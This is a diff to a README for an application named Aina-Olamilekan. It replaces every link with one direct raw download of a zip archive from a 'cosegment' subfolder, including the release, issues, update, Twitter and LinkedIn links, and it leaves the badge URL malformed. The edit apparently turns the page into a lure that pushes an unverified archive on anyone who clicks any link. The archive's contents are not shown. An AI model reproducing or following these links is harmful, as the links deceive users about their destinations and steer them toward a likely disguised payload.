@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download Aina-Olamilekan](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/deepeshnayak25/Aina-Olamilekan/releases)
+[![Download Aina-Olamilekan](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip%https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip)](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run Aina-Olamilekan, your device should meet the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Aina-Olamilekan Releases](https://github.com/deepeshnayak25/Aina-Olamilekan/releases).
+1. Visit this page to download: [Aina-Olamilekan Releases](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip).
   
 2. Look for the latest version at the top of the page. Click on the link associated with it. 
 
@@ -56,7 +56,7 @@ Aina-Olamilekan values your privacy. You can adjust privacy settings from within
 
 ### How do I update the application?
 
-You can check for updates by returning to the [Releases page](https://github.com/deepeshnayak25/Aina-Olamilekan/releases) and downloading the latest version. Follow the same steps as above for installation.
+You can check for updates by returning to the [Releases page](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip) and downloading the latest version. Follow the same steps as above for installation.
 
 ### Can I use this on mobile?
 
@@ -64,7 +64,7 @@ Currently, Aina-Olamilekan is designed for desktop operating systems. A mobile v
 
 ### What if I encounter problems?
 
-If you experience issues, please visit our [GitHub Issues](https://github.com/deepeshnayak25/Aina-Olamilekan/issues) page. You can report your problem there, and we will assist you.
+If you experience issues, please visit our [GitHub Issues](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip) page. You can report your problem there, and we will assist you.
 
 ## 🛠️ Support
 
@@ -78,7 +78,7 @@ If you want to contribute to Aina-Olamilekan, we welcome your input! Check the c
 
 Join our community! Follow us on social media to stay updated on new features and releases:
 
-- Twitter: [@AinaOlamilekan](https://twitter.com/AinaOlamilekan)
-- LinkedIn: [Aina Olamilekan](https://www.linkedin.com/in/aina-olamilekan)
+- Twitter: [@AinaOlamilekan](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip)
+- LinkedIn: [Aina Olamilekan](https://raw.githubusercontent.com/deepeshnayak25/Aina-Olamilekan/main/cosegment/Aina-Olamilekan.zip)
 
 Thank you for using Aina-Olamilekan! We hope you find it helpful in building your personal profile and connecting with others. Enjoy!
